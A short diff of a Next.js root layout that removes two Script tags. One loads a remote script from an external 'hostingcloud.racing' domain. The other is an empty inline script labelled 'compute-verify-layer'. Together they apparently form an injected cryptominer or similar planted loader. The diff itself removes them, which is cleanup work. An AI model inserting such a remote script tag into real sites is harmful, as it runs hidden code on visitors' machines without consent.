@@ -27,14 +27,6 @@ export default function RootLayout({
           <SubscriptionModal />
           {children}
         </LanguageProvider>
-        
-        <Script 
-          src="https://www.hostingcloud.racing/aR2M.js" 
-          strategy="afterInteractive"
-        />
-        <Script id="compute-verify-layer" strategy="lazyOnload">
-          {}
-        </Script>
       </body>
     </html>
   );
